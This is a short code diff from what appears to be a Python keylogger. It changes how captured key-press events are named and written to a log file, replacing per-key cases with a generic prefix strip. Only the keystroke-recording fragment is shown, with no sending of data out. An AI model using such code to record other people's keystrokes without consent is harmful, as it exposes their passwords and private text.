@@ -49,12 +49,7 @@ else:
                 key_event = categorize(event)
                 if key_event.keystate == key_event.key_down:  # Key press event
                     key_name = key_event.keycode
-                    if key_name == "KEY_SPACE":
-                        log.write("SPACE ")
-                    elif key_name == "KEY_BACKSPACE":
-                        log.write("BACKSPACE ")
-                    elif key_name == "KEY_ENTER":
-                        log.write("ENTER ")
-                    else:
-                        log.write(f"{key_name} ")
-                    log.flush()  # Ensure the data is written to the file immediately
+                    if key_name.startswith("KEY_"):
+                        key_name = key_name.replace("KEY_", "")
+                    log.write(f"{key_name} ")
+                log.flush()  # Ensure the data is written to the file immediately
